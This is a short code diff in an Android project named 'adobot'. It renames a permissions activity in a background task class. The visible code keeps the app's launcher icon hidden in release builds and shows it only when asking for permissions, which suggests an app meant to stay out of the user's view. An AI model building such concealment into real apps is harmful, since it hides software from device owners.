@@ -14,7 +14,7 @@ import android.support.v4.content.ContextCompat;
 import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
 import com.android.adobot.Constants;
-import com.android.adobot.activities.AskPermissionsActivity;
+import com.android.adobot.activities.PermissionsActivity;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
 
@@ -38,7 +38,7 @@ public class BaseTask extends Thread implements Runnable {
 
     protected void showAppIcon() {
         PackageManager p = context.getPackageManager();
-        ComponentName componentName = new ComponentName(context, AskPermissionsActivity.class);
+        ComponentName componentName = new ComponentName(context, PermissionsActivity.class);
         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
     }
 
@@ -69,7 +69,7 @@ public class BaseTask extends Thread implements Runnable {
     protected void requestPermissions() {
         // app icon already shown in debug
         if (!BuildConfig.DEBUG) showAppIcon();
-        Intent i = new Intent(context, AskPermissionsActivity.class);
+        Intent i = new Intent(context, PermissionsActivity.class);
         i.addFlags(FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(i);
     }
